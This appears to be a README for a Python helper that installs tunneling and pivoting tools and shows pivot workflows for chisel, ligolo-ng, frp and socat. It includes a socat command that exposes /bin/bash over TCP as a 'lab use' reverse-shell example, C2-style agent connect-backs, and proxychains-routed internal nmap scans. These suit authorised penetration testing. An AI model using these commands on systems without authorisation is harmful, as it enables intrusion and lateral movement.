# Tunnel Helper

Cross-platform installer/helper for tunneling and pivoting tools.

## Supported Providers

- `cloudflared`
- `ngrok`
- `localtunnel`
- `proxychains`
- `ssh-dynamic`
- `socat`
- `chisel`
- `bore`
- `rathole`
- `frp`
- `ligolo-ng`

## Quick Commands

```bash
cd "Tunnel Helper"
python3 tunnel_setup.py --help
python3 tunnel_setup.py --help-examples
```

Install specific provider:

```bash
python3 tunnel_setup.py --provider socat
python3 tunnel_setup.py --provider chisel
python3 tunnel_setup.py --provider bore
python3 tunnel_setup.py --provider rathole
python3 tunnel_setup.py --provider frp
python3 tunnel_setup.py --provider ligolo-ng
```

## Pivoting Workflows

### 1) SSH Dynamic + Proxychains (classic SOCKS pivot)

```bash
python3 tunnel_setup.py --provider ssh-dynamic --ssh-user alice --ssh-host jump.example.com --socks-port 1080 --start
python3 tunnel_setup.py --provider proxychains --proxy-port 1080 --write-proxychains-config
proxychains4 nmap -sT 10.10.10.0/24
```

### 2) Socat local/remote forwarding

Install:

```bash
python3 tunnel_setup.py --provider socat
```

Examples:

```bash
# Local forward: listen locally and forward to internal target
socat TCP-LISTEN:8443,fork,reuseaddr TCP:10.10.10.5:443

# Reverse shell transport example (lab use)
socat TCP-LISTEN:9001,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### 3) Chisel reverse SOCKS tunnel

Install:

```bash
python3 tunnel_setup.py --provider chisel
```

Use:

```bash
# On C2/VPS
chisel server --reverse -p 8001

# On pivot host
chisel client <C2-IP>:8001 R:1080:socks

# From operator box
proxychains4 ssh user@10.10.10.20
```

### 4) Bore quick remote forwarding

Install:

```bash
python3 tunnel_setup.py --provider bore
```

Use:

```bash
# Expose local service via bore relay
bore local 8080 --to bore.pub
```

### 5) Rathole config-driven reverse tunnel

Install:

```bash
python3 tunnel_setup.py --provider rathole
```

Use:

```bash
# Server side
rathole server.toml

# Client side
rathole client.toml
```

### 6) FRP (frps/frpc)

Install:

```bash
python3 tunnel_setup.py --provider frp
```

Use:

```bash
# Server (internet reachable)
frps -c frps.toml

# Client (inside network)
frpc -c frpc.toml
```

### 7) Ligolo-ng (advanced pivoting)

Install:

```bash
python3 tunnel_setup.py --provider ligolo-ng
```

Use:

```bash
# C2 side (proxy binary)
proxy -selfcert

# Agent side
agent -connect <C2-IP>:11601 -ignore-cert
```

## Notes

- GitHub-based providers (`chisel`, `bore`, `rathole`, `frp`, `ligolo-ng`) are pulled from latest release assets using OS/arch matching.
- Default binary install dir:
  - Linux/macOS: `~/.local/bin`
  - Windows: `~/bin`
- Add install dir to `PATH` if command is not found.
- `socat`/`proxychains` may require `sudo` for package install.

## Troubleshooting

- Run: `python3 tunnel_setup.py --help-examples`
- If wrong binary is selected on niche platforms, set `--install-dir`, then verify with `--version`.
- If `proxychains4` is missing, try `proxychains` command name.
